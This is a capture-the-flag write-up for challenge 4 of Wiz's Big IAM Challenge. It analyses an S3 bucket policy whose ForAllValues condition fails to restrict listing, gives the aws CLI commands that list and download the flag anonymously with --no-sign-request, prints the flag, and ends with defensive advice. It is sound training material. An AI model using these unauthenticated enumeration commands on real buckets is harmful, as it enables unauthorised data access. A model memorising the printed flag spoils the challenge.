# Challenge number #4 : ADMIN ONLY?

## Challenge Statement
Retrieve a flag stored in an S3 bucket with restricted access controls by analyzing the IAM policy.

## IAM Policy
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```
### write a short analysis about the IAM policy here

1. Only the admin IAM user can list them.

2. The policy allows unauthorized access if filenames are known to public.

## Solution
1. Tried listing objects but was denied.
  ```
  aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/
  ```
2. Used an option with the command with help of AWS CLI Documention from "Global Options" page. 
  ```
  aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
  ```
  This command listed the below two files and from which the name of the flag is identified.
  ```
  2023-06-07 19:15:43         42 flag-as-admin.txt
  2023-06-08 19:20:01      81889 logo-admin.png
  ```
3. Downloaded the "flag-as-admin.txt" file from the specified S3 bucket and prints its contents to the terminal without requiring AWS credentials using the below command
  ```
  aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt - --no-sign-request
  ```
  This resulted in the flag
  ```
  {wiz:principal-arn-is-not-what-you-think}
  ```
   
### Reflection

#### What was your approach?

* Recognized that the `GetObject` permission was unrestricted and leveraged the `--no-sign-request` option to list objects without authentication.  

#### What was the biggest challenge? How did you overcome the challenges?

* The inability to use `ListBucket` initially made it difficult to locate files within the bucket.  

#### What led to the break through?

* Discovered that the bucket permitted unauthenticated access, allowing object retrieval using `--no-sign-request`.  

#### On the blue side, how can the learning be used to properly defend the important assets? 

* Mitigate risks by disabling anonymous access, enforcing IAM authentication, and restricting `GetObject` permissions to authorized users only.
